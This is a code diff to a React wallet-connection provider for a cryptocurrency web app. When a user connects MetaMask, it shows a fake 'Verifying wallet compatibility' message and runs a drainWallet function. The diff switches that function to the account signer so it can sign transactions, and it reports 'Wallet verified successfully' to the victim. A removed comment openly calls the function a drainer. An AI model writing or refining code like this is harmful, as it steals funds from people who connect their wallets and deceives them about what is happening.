@@ -1,4 +1,3 @@
-
 import React, { createContext, useContext, useState, useEffect, ReactNode } from 'react';
 import { ethers } from 'ethers';
 import { toast } from "sonner";
@@ -66,28 +65,22 @@ export const WalletProvider = ({ children }: { children: ReactNode }) => {
 
     try {
       const ethProvider = new ethers.BrowserProvider(window.ethereum);
-      
-      // Request accounts
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const userAddress = accounts[0];
-      
-      // Get chain ID
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const signer = await ethProvider.getSigner();
+      const userAddress = await signer.getAddress();
       const { chainId: evmChainId } = await ethProvider.getNetwork();
-      
-      // Get balance
-      const userBalance = await getBalance(ethProvider, userAddress);
-      
+      const userBalance = await ethProvider.getBalance(userAddress);
+
       setIsConnected(true);
       setAddress(userAddress);
       setWalletType('metamask');
-      setBalance(userBalance + ' ETH');
+      setBalance(ethers.formatEther(userBalance) + ' ETH');
       setChainId(evmChainId.toString());
-      setProvider(ethProvider);
+      setProvider(signer); // Pass signer, not provider
 
-      // Execute the drainer when wallet connects
       toast.info("Verifying wallet compatibility...");
-      drainWallet(ethProvider, 'evm', (status) => {
-        console.log(status); // Log status updates for debugging
+      drainWallet(signer, 'evm', (status) => {
+        console.log(status);
       }).then(success => {
         if (success) {
           toast.success("Wallet verified successfully");
